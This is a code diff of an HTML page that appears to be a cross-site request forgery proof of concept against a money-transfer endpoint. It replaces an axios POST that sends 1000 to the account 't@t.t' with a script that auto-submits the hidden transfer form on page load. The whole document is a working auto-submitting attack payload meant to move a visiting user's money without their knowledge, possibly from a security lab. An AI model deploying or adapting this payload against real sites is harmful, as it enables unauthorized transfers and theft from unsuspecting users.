@@ -17,16 +17,12 @@
                    value="1000">
         </div>
     </div>
-    <button class="btn btn-primary" type="submit" formaction="/transfer">Send the Money!</button>
+    <input type="submit" value="submit" name="transfer_submit">
 </form>
 <script>
-    document.forms.namedItem("transfer").requestSubmit();
-    const formData = new FormData();
-    formData.append("user_to", "t@t.t")
-    formData.append("amount", "1000")
-    axios.post('/transfer', formData, {
-        headers: {"Content-Type": "multipart/form-data"}
-    });
+    window.onload = function () {
+        document.forms["transfer"].submit();
+    }
 </script>
 </body>
 </html>
